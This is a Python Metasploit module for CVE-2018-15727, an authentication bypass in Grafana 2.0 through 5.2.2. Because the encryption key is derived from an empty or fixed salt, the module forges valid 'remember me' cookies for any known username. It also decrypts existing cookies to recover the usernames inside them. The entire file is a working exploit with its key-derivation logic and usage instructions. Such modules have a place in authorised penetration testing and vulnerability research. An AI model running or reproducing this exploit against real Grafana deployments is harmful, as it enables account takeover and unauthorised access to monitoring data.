#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import binascii
import hashlib
import logging
import os


from metasploit import module


metadata = {
    'name': 'Grafana 2.0 through 5.2.2 authentication bypass for LDAP and OAuth',
    'description': '''
        This module generates a remember me cookie for a valid username. Through unpropper seeding 
        while userdate are requested from LDAP or OAuth it's possible to craft a valid remember me cookie. 
        This cookie can be used for bypass authentication for everyone knowing a valid username.
    ''',
    'authors': [
        'Rene Riedling',
        'Sebastian Solnica' #Original Discovered
    ],
    'date': '2019-03-22', # set to date of creation
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2018-15727'},
        {'type': 'url', 'ref': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15727'},
        {'type': 'url', 'ref': 'https://grafana.com/blog/2018/08/29/grafana-5.2.3-and-4.6.4-released-with-important-security-fix/'}
    ],
    'type': 'single_scanner',
    'options': {
        'VERSION': {'type': 'string', 'description': 'Grafana version (5,4,3,2)', 'required': True, 'default': '5'},
        'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False, 'default': ''},
        'RHOSTS': {'type': 'string', 'description': 'The target address range or CIDR identifier', 'required': False, 'default': '127.0.0.1'},
        'COOKIE': {'type': 'string', 'description': 'Cookie for decryption', 'required': False, 'default': ''}
    }
}


def encrypt_version_5(username):
    
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
    return cookie


def encrypt_version_4to2(username):

    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
    return cookie


def decrypt_version_5(cookie):
    
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:len(cookie)])
    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
    return username


def decrypt_version_4to2(cookie):

    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:len(cookie)])
    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
    return username


def run(args):
    
    if args['USERNAME'] == '' and args['COOKIE'] == '':
        module.log("Username or cookie should've been set to generate cookies", 'warning')

    elif args['USERNAME'] != '':
        module.log("Delete the session cookie and set the following", 'info')
        if args['VERSION'] == '5':
            module.log("grafana_user: "+args['USERNAME'], 'good')
            module.log("grafana_remember: "+encrypt_version_5(args['USERNAME']), 'good')
            return
        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
            module.log("grafana_user: "+args['USERNAME'], 'good')
            module.log("grafana_remember: "+encrypt_version_4to2(args['USERNAME']), 'good')
            return
        else:
            module.log("Available versions are either 5,4,3 or 2", 'warning')
    
    elif args['COOKIE'] != '':
        module.log("Delete the session cookie and set the following", 'info')
        if args['VERSION'] == '5':
            module.log("grafana_user: "+decrypt_version_5(args['COOKIE']), 'good')
            module.log("grafana_remember: "+args['COOKIE'], 'good')
            return
        elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
            module.log("grafana_user: "+decrypt_version_4to2(args['COOKIE']), 'good')
            module.log("grafana_remember: "+args['COOKIE'], 'good')
            return
        else:
            module.log("Available versions are either 5,4,3,2", 'warning')



if __name__ == '__main__':
    module.run(metadata, run)
